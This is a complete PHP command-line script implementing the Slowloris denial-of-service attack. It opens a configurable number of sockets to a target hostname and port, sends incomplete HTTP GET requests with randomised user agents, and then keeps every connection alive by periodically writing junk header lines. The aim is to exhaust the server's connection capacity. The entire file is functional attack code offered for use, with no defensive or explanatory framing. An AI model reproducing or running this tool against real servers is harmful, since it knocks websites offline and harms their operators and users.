<?php

include __DIR__ . '/user-agents.php.inc';

[$hostname, $port, $socketCount, $timeout] = validateArguments($argv);

$isActive = true;

registerSignals($isActive);

loop($hostname, $port, $socketCount, $timeout, $isActive);

function getRandomUserAgent(): string
{
    return USER_AGENTS[\array_rand(USER_AGENTS)];
}

function validateArguments(array $argv): array
{
    $hostname    = $argv[1] ?? null;
    $port        = $argv[2] ?? null;
    $socketCount = $argv[3] ?? 150;
    $timeout     = $argv[4] ?? 10;

    if (!$hostname && !$port) {
        echo 'usage: php slowloris.php hostname port [socketCount] [timeout]' . PHP_EOL;
        die;
    }

    if (!is_numeric($port)) {
        echo 'Port must be numeric' . PHP_EOL;
        die;
    }

    if (!is_numeric($socketCount)) {
        echo 'Socket count must be numeric' . PHP_EOL;
        die;
    }

    if (!is_numeric($timeout)) {
        echo 'Timeout must be numeric' . PHP_EOL;
        die;
    }

    return [$hostname, $port, $socketCount, $timeout];
}

/**
 * @param string $hostname
 * @param int    $port
 *
 * @return false|resource
 */
function initializeSocket(string $hostname, int $port)
{
    $socket = \socket_create(AF_INET, SOCK_STREAM, SOL_TCP);

    \socket_connect($socket, \gethostbyname($hostname), $port);

    $userAgent = getRandomUserAgent();
    $message   = "GET / HTTP/1.1\r\n";
    $message .= "Host: $hostname\r\n";
    $message .= "User-Agent: $userAgent\r\n";
    $message .= "Accept-Language: en-US,en,q=0.5\r\n";

    \socket_write($socket, $message, \strlen($message));

    return $socket;
}

function registerSignals(bool &$isActive): void
{
    $callback = static function () use (&$isActive) {
        echo 'Gracefully shutting down...' . PHP_EOL;

        $isActive = false;
    };

    \pcntl_async_signals(true);
    \pcntl_signal(SIGINT, $callback);
    \pcntl_signal(SIGTERM, $callback);
}

function loop(string $hostname, int $port, int $socketCount, int $timeout, bool $isActive): void
{
    $listOfSockets = [];
    while ($isActive) {
        $activeCount = ($socketCount - \count($listOfSockets));

        echo 'Building sockets...' . PHP_EOL;

        for ($i = 0; $i < $activeCount; $i++) {
            $socket = initializeSocket($hostname, $port);

            $listOfSockets[] = $socket;
        }

        $packetCount = 0;

        echo 'Sending data...' . PHP_EOL;

        foreach ($listOfSockets as $key => $socket) {
            $message = \sprintf("X-a: %s\r\n", \random_int(1, 5000));

            if (@\socket_write($socket, $message, \strlen($message)) === false) {
                unset($listOfSockets[$key]);
                \socket_close($socket);
            } else {
                $packetCount++;
            }
        }

        echo "$packetCount packets sent successfully. Thread now sleeping for $timeout seconds..." . PHP_EOL;

        \sleep($timeout);
    }
}
